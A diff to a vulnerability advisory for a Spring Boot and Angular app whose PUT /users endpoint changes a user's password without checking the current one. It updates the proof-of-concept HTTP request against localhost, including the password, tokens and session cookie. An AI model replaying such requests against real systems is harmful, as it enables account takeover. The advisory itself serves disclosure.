@@ -11,7 +11,7 @@ SpringBoot and Angular code lack any validating parameter for the current passwo
     PUT /users
     raw:
     {
-        "newPassword" : "password",
+        "newPassword" : "password1!",
         "username" : "timmy"
     }
 
@@ -27,11 +27,11 @@ Successful exploitation looks like:
 
     PUT /users HTTP/1.1
     Host: 127.0.0.1:8081
-    Content-Length: 52
+    Content-Length: 47
     sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
     Accept: application/json, text/plain, */*
     Content-Type: application/json
-    X-XSRF-TOKEN: 877dd681-4a9f-41f0-ae74-d1ada25aab32
+    X-XSRF-TOKEN: d5e05d8a-d66b-4426-8b79-161349ab4b17
     sec-ch-ua-mobile: ?0
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
     sec-ch-ua-platform: "Windows"
@@ -42,8 +42,8 @@ Successful exploitation looks like:
     Referer: http://127.0.0.1:4200/
     Accept-Encoding: gzip, deflate
     Accept-Language: en-US,en;q=0.9
-    Cookie: XSRF-TOKEN=877dd681-4a9f-41f0-ae74-d1ada25aab32; JSESSIONID=1C77B365979B077008298700287FA604
+    Cookie: XSRF-TOKEN=d5e05d8a-d66b-4426-8b79-161349ab4b17; JSESSIONID=E5FCD0A443D296E9E5FEECEE96D6EF35
     Connection: close
 
-    {"username":"timmy","newPassword":"password"}
+    {"username":"timmy","newPassword":"password1!"}
 
